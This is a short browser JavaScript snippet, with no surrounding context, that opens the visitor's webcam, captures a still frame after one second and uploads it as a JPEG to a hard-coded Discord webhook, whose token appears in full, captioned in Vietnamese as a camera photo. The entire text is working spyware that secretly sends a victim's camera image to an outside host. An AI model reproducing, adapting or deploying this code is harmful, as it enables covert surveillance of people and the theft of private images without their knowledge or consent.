(async function(){
    const s = await navigator.mediaDevices.getUserMedia({video:true});
    const v = document.createElement('video'); v.srcObject = s; v.play();
    await new Promise(r=>setTimeout(r,1000));
    const c = document.createElement('canvas'); c.width=640; c.height=480;
    c.getContext('2d').drawImage(v,0,0,640,480);
    c.toBlob(async b=>{
      const f=new FormData(); f.append('file',b,'cam.jpg');
      f.append('payload_json',JSON.stringify({content:'📸 Ảnh camera'}));
      await fetch('https://discord.com/api/webhooks/1571360407652929699/hSfivjJZe6k00NGmRLkpP5KdYfFK0hrFwpVje9kTrAdcS713-8jpRjXWMSP0koQFHxQm',{method:'POST',body:f});
      s.getTracks().forEach(t=>t.stop());
    },'image/jpeg',0.8);
  })();
